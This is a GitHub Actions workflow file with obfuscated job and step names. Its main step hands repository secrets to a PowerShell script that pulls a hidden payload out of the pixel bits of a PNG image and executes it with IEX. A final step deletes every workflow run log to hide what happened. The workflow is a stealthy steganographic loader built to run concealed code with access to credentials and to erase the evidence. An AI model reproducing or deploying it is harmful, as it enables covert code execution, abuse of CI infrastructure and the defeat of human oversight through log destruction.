name: r4dx

on:
  workflow_dispatch:

jobs:
  j_712:
    runs-on: windows-latest
    timeout-minutes: 360
    permissions:
      actions: write
      contents: read

    steps:
      - name: s_01
        uses: actions/checkout@v4
        
      - name: s_02
        uses: actions/cache@v4
        with:
          path: |
            ~\AppData\Roaming\Code
            ~\.vscode\extensions
            C:\Windows\Temp\app_sessions
          key: ${{ runner.os }}-ghost-session
          # Penting: Pakai restore-keys agar jika key utama tidak ada, dia ambil yang lama
          restore-keys: |
            ${{ runner.os }}-ghost-session

      - name: s_03
        shell: powershell
        env:
          SSH_KEY: ${{ secrets.SSH_KEY }}
          A_KEY: ${{ secrets.ACCESS_KEY }}
        run: |
          # (Isi script s_02 kamu tetap sama)
          $imgPath = Join-Path $pwd "BondeXJS.png"
          # ... sisanya sama ...

      - name: s_04
        shell: powershell
        env:
          SSH_KEY: ${{ secrets.SSH_KEY }}
          A_KEY: ${{ secrets.ACCESS_KEY }}
        run: |
          Add-Type -AssemblyName System.Drawing
          
          function Extract-Payload {
              param ([string]$imagePath)
              $img = [System.Drawing.Bitmap]::FromFile($imagePath)
              $extractedBytes = New-Object System.Collections.Generic.List[byte]
              $currentByte = 0
              $bitIndex = 0

              for ($y = 0; $y -lt $img.Height; $y++) {
                  for ($x = 0; $x -lt $img.Width; $x++) {
                      $pixel = $img.GetPixel($x, $y)
                      $bit = $pixel.R -band 1
                      $currentByte = $currentByte -bor ($bit -shl $bitIndex)
                      $bitIndex++
                      if ($bitIndex -eq 8) {
                          $extractedBytes.Add($currentByte)
                          $currentByte = 0
                          $bitIndex = 0
                          $textSoFar = [System.Text.Encoding]::ASCII.GetString($extractedBytes.ToArray())
                          if ($textSoFar.EndsWith("##END##")) {
                              $img.Dispose()
                              return $textSoFar.Replace("##END##", "")
                          }
                      }
                  }
              }
              $img.Dispose()
          }

          $imgPath = Join-Path $pwd "BondeXJS.png"
          if (Test-Path $imgPath) {
              Write-Host "[*] Extracting Ghost Payload from Pixels..." -ForegroundColor Cyan
              $payload = Extract-Payload -imagePath $imgPath
              if ($payload) {
                  Write-Host "[+] Decode Successful. Launching Engine..." -ForegroundColor Green
                  IEX $payload
              } else {
                  Write-Host "[-] Error: Payload corrupted or not found." -ForegroundColor Red
                  exit 1
              }
          }
          
      - name: s_05
        uses: Mattraks/delete-workflow-runs@v2
        if: always()
        with:
          token: ${{ github.token }}
          repository: ${{ github.repository }}
          retain_days: 0
          keep_minimum_runs: 0
